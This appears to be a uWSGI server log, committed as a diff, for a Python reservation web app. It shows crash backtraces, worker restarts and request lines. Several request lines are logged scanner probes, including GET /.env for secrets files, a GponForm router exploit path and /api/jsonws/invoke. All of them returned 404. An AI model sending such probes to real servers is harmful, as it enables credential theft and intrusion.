+uwsgi(simple_loop_run+0xb6) [0x55b559af1b36]
+uwsgi(simple_loop+0x10) [0x55b559af1940]
+uwsgi(uwsgi_ignition+0x2ab) [0x55b559af620b]
+uwsgi(uwsgi_worker_run+0x26e) [0x55b559afa8be]
+uwsgi(+0x87e84) [0x55b559afae84]
+uwsgi(+0x348ee) [0x55b559aa78ee]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xe7) [0x7f4728862b97]
+uwsgi(_start+0x2a) [0x55b559aa791a]
+*** end of backtrace ***
+*** backtrace of 22759 ***
+uwsgi(uwsgi_backtrace+0x2a) [0x55b559af5aba]
+uwsgi(uwsgi_segfault+0x23) [0x55b559af5ea3]
+/lib/x86_64-linux-gnu/libc.so.6(+0x3ef20) [0x7f472887ff20]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x131ea4) [0x7f4728d63ea4]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x2198ae) [0x7f4728e4b8ae]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x135375) [0x7f4728d67375]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(PyGC_Collect+0x5d) [0x7f4728d6832d]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(Py_FinalizeEx+0x73) [0x7f4728d909c3]
+uwsgi(uwsgi_plugins_atexit+0x81) [0x55b559af3fc1]
+/lib/x86_64-linux-gnu/libc.so.6(+0x43041) [0x7f4728884041]
+/lib/x86_64-linux-gnu/libc.so.6(+0x4313a) [0x7f472888413a]
+uwsgi(+0x37f9f) [0x55b559aaaf9f]
+uwsgi(end_me+0x25) [0x55b559af2c25]
+/lib/x86_64-linux-gnu/libpthread.so.0(+0x12890) [0x7f4729ac3890]
+/lib/x86_64-linux-gnu/libpthread.so.0(+0x1110d) [0x7f4729ac210d]
+/lib/x86_64-linux-gnu/libpthread.so.0(pthread_mutex_lock+0x83) [0x7f4729abb023]
+uwsgi(wsgi_req_accept+0x43c) [0x55b559aa883c]
+uwsgi(simple_loop_run+0xb6) [0x55b559af1b36]
+uwsgi(simple_loop+0x10) [0x55b559af1940]
+uwsgi(uwsgi_ignition+0x2ab) [0x55b559af620b]
+uwsgi(uwsgi_worker_run+0x26e) [0x55b559afa8be]
+uwsgi(+0x87e84) [0x55b559afae84]
+uwsgi(+0x348ee) [0x55b559aa78ee]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xe7) [0x7f4728862b97]
+uwsgi(_start+0x2a) [0x55b559aa791a]
+*** end of backtrace ***
+*** backtrace of 22757 ***
+uwsgi(uwsgi_backtrace+0x2a) [0x55b559af5aba]
+uwsgi(uwsgi_segfault+0x23) [0x55b559af5ea3]
+/lib/x86_64-linux-gnu/libc.so.6(+0x3ef20) [0x7f472887ff20]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x131ea4) [0x7f4728d63ea4]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x2198ae) [0x7f4728e4b8ae]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x135375) [0x7f4728d67375]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(PyGC_Collect+0x5d) [0x7f4728d6832d]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(Py_FinalizeEx+0x73) [0x7f4728d909c3]
+uwsgi(uwsgi_plugins_atexit+0x81) [0x55b559af3fc1]
+/lib/x86_64-linux-gnu/libc.so.6(+0x43041) [0x7f4728884041]
+/lib/x86_64-linux-gnu/libc.so.6(+0x4313a) [0x7f472888413a]
+uwsgi(+0x37f9f) [0x55b559aaaf9f]
+uwsgi(end_me+0x25) [0x55b559af2c25]
+/lib/x86_64-linux-gnu/libpthread.so.0(+0x12890) [0x7f4729ac3890]
+/lib/x86_64-linux-gnu/libc.so.6(epoll_wait+0x57) [0x7f4728962bb7]
+uwsgi(event_queue_wait+0x34) [0x55b559ae9224]
+uwsgi(wsgi_req_accept+0x13a) [0x55b559aa853a]
+uwsgi(simple_loop_run+0xb6) [0x55b559af1b36]
+uwsgi(simple_loop+0x10) [0x55b559af1940]
+uwsgi(uwsgi_ignition+0x2ab) [0x55b559af620b]
+uwsgi(uwsgi_worker_run+0x26e) [0x55b559afa8be]
+uwsgi(+0x87e84) [0x55b559afae84]
+uwsgi(+0x348ee) [0x55b559aa78ee]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xe7) [0x7f4728862b97]
+uwsgi(_start+0x2a) [0x55b559aa791a]
+*** end of backtrace ***
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jul  9 15:16:56 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x563903b9cd40
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 22755)
+spawned uWSGI worker 1 (pid: 15712, cores: 2)
+spawned uWSGI worker 2 (pid: 15713, cores: 2)
+spawned uWSGI worker 3 (pid: 15714, cores: 2)
+spawned uWSGI worker 4 (pid: 15715, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x563903b9cd40 pid: 15715 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x563903b9cd40 pid: 15713 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x563903b9cd40 pid: 15714 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x563903b9cd40 pid: 15712 (default app)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jul  9 15:17:04 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55b7e67a1d40
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 22755)
+spawned uWSGI worker 1 (pid: 15748, cores: 2)
+spawned uWSGI worker 2 (pid: 15749, cores: 2)
+spawned uWSGI worker 3 (pid: 15750, cores: 2)
+spawned uWSGI worker 4 (pid: 15751, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55b7e67a1d40 pid: 15751 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55b7e67a1d40 pid: 15750 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55b7e67a1d40 pid: 15748 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55b7e67a1d40 pid: 15749 (default app)
+Thu Jul  9 15:17:18 2020 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Thu Jul  9 15:17:18 2020 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jul  9 15:18:47 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+writing pidfile to uwsgi.pid
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55a68305e330
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 16042, cores: 2)
+spawned uWSGI worker 2 (pid: 16043, cores: 2)
+spawned uWSGI worker 3 (pid: 16044, cores: 2)
+spawned uWSGI worker 4 (pid: 16045, cores: 2)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a68305e330 pid: 16045 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a68305e330 pid: 16044 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a68305e330 pid: 16043 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a68305e330 pid: 16042 (default app)
+[pid: 16042|app: 0|req: 1/1] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:19:02 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 2/2] 223.104.63.195 () {40 vars in 677 bytes} [Thu Jul  9 15:19:51 2020] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 3/3] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:20:30 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 4/4] 223.104.63.195 () {40 vars in 732 bytes} [Thu Jul  9 15:21:40 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 5/5] 223.104.63.195 () {42 vars in 759 bytes} [Thu Jul  9 15:26:59 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 6/6] 223.104.63.195 () {40 vars in 732 bytes} [Thu Jul  9 15:27:13 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16045|app: 0|req: 1/7] 42.236.10.75 () {38 vars in 832 bytes} [Thu Jul  9 15:27:15 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 7/8] 42.236.10.75 () {44 vars in 918 bytes} [Thu Jul  9 15:27:18 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 8/9] 42.236.10.75 () {38 vars in 832 bytes} [Thu Jul  9 15:27:28 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 16044|app: 0|req: 1/10] 42.236.10.75 () {44 vars in 918 bytes} [Thu Jul  9 15:27:28 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 9/11] 223.104.63.195 () {40 vars in 720 bytes} [Thu Jul  9 15:32:21 2020] GET /now_user => generated 5065 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 10/12] 223.104.63.195 () {40 vars in 724 bytes} [Thu Jul  9 15:32:38 2020] GET /management => generated 3864 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 16043|app: 0|req: 1/13] 180.163.220.3 () {44 vars in 922 bytes} [Thu Jul  9 15:32:40 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 11/14] 223.104.63.195 () {40 vars in 647 bytes} [Thu Jul  9 15:32:52 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 12/15] 103.76.211.106 () {32 vars in 445 bytes} [Thu Jul  9 15:37:13 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 13/16] 42.236.10.117 () {38 vars in 825 bytes} [Thu Jul  9 15:37:52 2020] GET /now_user => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 14/17] 42.236.10.117 () {44 vars in 911 bytes} [Thu Jul  9 15:37:53 2020] GET /now_user => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 15/18] 13.48.129.160 () {32 vars in 343 bytes} [Thu Jul  9 16:07:25 2020] GET /.env => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 16/19] 180.247.232.97 () {32 vars in 445 bytes} [Thu Jul  9 16:15:55 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 17/20] 138.122.48.63 () {32 vars in 444 bytes} [Thu Jul  9 16:18:53 2020] GET / => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 18/21] 223.71.167.164 () {34 vars in 439 bytes} [Thu Jul  9 16:29:49 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 19/22] 18.230.149.7 () {32 vars in 342 bytes} [Thu Jul  9 17:08:33 2020] GET /.env => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 20/23] 123.125.67.225 () {38 vars in 542 bytes} [Thu Jul  9 17:15:18 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 21/24] 116.179.32.31 () {38 vars in 494 bytes} [Thu Jul  9 17:20:19 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+Empty python request. skip.
+[pid: 16042|app: -1|req: -1/25]  () {0 vars in 0 bytes} [Thu Jul  9 17:46:58 2020]   => generated 0 bytes in 0 msecs ( 0) 0 headers in 0 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 22/26] 171.13.14.6 () {42 vars in 733 bytes} [Thu Jul  9 18:03:37 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 23/27] 161.97.81.64 () {26 vars in 261 bytes} [Thu Jul  9 18:30:58 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 87 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 24/28] 66.228.33.237 () {32 vars in 394 bytes} [Thu Jul  9 18:40:16 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 25/29] 183.136.225.45 () {34 vars in 439 bytes} [Thu Jul  9 18:44:03 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 26/30] 139.162.88.63 () {32 vars in 400 bytes} [Thu Jul  9 18:55:15 2020] GET /echo.php?info=1234567890 => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 27/31] 118.249.205.242 () {38 vars in 484 bytes} [Thu Jul  9 19:05:48 2020] POST /GponForm/diag_Form?images/ => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 28/32] 101.251.242.238 () {38 vars in 577 bytes} [Thu Jul  9 19:15:45 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16043|app: 0|req: 2/33] 195.54.160.135 () {38 vars in 590 bytes} [Thu Jul  9 19:15:57 2020] POST /api/jsonws/invoke => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 29/34] 223.104.63.195 () {46 vars in 865 bytes} [Thu Jul  9 19:21:34 2020] GET /management => generated 3864 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 16044|app: 0|req: 2/35] 59.36.129.40 () {36 vars in 464 bytes} [Thu Jul  9 19:21:55 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.0 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 16045|app: 0|req: 2/36] 221.13.1.136 () {42 vars in 969 bytes} [Thu Jul  9 19:22:04 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 30/37] 223.104.63.195 () {48 vars in 957 bytes} [Thu Jul  9 19:22:35 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 31/38] 223.104.63.195 () {44 vars in 847 bytes} [Thu Jul  9 19:24:17 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 32/39] 171.13.14.75 () {42 vars in 702 bytes} [Thu Jul  9 19:36:05 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 33/40] 106.45.1.62 () {44 vars in 742 bytes} [Thu Jul  9 20:08:02 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 34/41] 139.162.119.197 () {32 vars in 381 bytes} [Thu Jul  9 20:25:35 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 35/42] 83.97.20.29 () {26 vars in 259 bytes} [Thu Jul  9 21:04:42 2020] GET / => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 36/43] 223.104.63.195 () {42 vars in 803 bytes} [Thu Jul  9 21:10:12 2020] GET /admin => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+uwsgi_proto_uwsgi_parser(): Connection reset by peer [proto/uwsgi.c line 35]
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16042|app: 0|req: 37/44] 122.51.93.206 () {42 vars in 778 bytes} [Thu Jul  9 21:38:16 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16045|app: 0|req: 3/45] 122.51.93.206 () {42 vars in 806 bytes} [Thu Jul  9 21:38:16 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 16042|app: 0|req: 38/46] 192.241.219.185 () {34 vars in 399 bytes} [Thu Jul  9 21:45:15 2020] GET /ReportServer => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 39/47] 80.82.70.187 () {32 vars in 413 bytes} [Thu Jul  9 21:52:29 2020] GET /cache/global/img/gs.gif => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 40/48] 185.39.11.105 () {40 vars in 651 bytes} [Thu Jul  9 21:53:14 2020] GET /config/getuser?index=0 => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 41/49] 223.104.63.195 () {48 vars in 997 bytes} [Thu Jul  9 23:40:52 2020] GET /management => generated 3864 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 42/50] 223.104.63.195 () {44 vars in 879 bytes} [Thu Jul  9 23:41:09 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16042|app: 0|req: 43/51] 223.104.63.195 () {40 vars in 684 bytes} [Thu Jul  9 23:44:56 2020] GET /now_user?&desk=3 => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 44/52] 223.104.63.195 () {42 vars in 724 bytes} [Thu Jul  9 23:45:05 2020] GET /now_order => generated 3295 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 45/53] 223.104.63.195 () {42 vars in 715 bytes} [Thu Jul  9 23:45:07 2020] GET /now_cart => generated 4910 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 0)
+[pid: 16042|app: 0|req: 46/54] 223.104.63.195 () {42 vars in 714 bytes} [Thu Jul  9 23:45:08 2020] GET /now_user => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 47/55] 223.104.63.195 () {40 vars in 739 bytes} [Thu Jul  9 23:45:42 2020] GET /now_user?&desk=3 => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 48/56] 192.241.239.201 () {34 vars in 387 bytes} [Fri Jul 10 00:18:22 2020] GET /hudson => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 16042|app: 0|req: 49/57] 223.104.63.195 () {46 vars in 823 bytes} [Fri Jul 10 00:33:21 2020] GET /now_user?&desk=3 => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+-- unavailable modifier requested: 3 --
+[pid: 16042|app: 0|req: 50/59] 223.104.63.195 () {40 vars in 739 bytes} [Fri Jul 10 00:34:31 2020] GET /now_user?&desk=7 => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 51/60] 223.104.63.195 () {46 vars in 830 bytes} [Fri Jul 10 00:34:48 2020] GET /now_cart => generated 4910 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 52/61] 223.104.63.195 () {42 vars in 771 bytes} [Fri Jul 10 00:35:00 2020] GET /now_order => generated 3295 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 53/62] 223.104.63.195 () {42 vars in 769 bytes} [Fri Jul 10 00:35:46 2020] GET /now_user => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 16042|app: 0|req: 54/63] 223.104.63.195 () {48 vars in 908 bytes} [Fri Jul 10 00:35:48 2020] GET /now_cart => generated 4910 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 0)
+Fri Jul 10 00:40:59 2020 - *** /home/ubuntu/DietSystem/ReservationSystem/visible has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 16042)...
+Gracefully killing worker 2 (pid: 16043)...
+Gracefully killing worker 3 (pid: 16044)...
+Gracefully killing worker 4 (pid: 16045)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from visible_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Jul 10 00:41:00 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55a857d9fd30
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 29914, cores: 2)
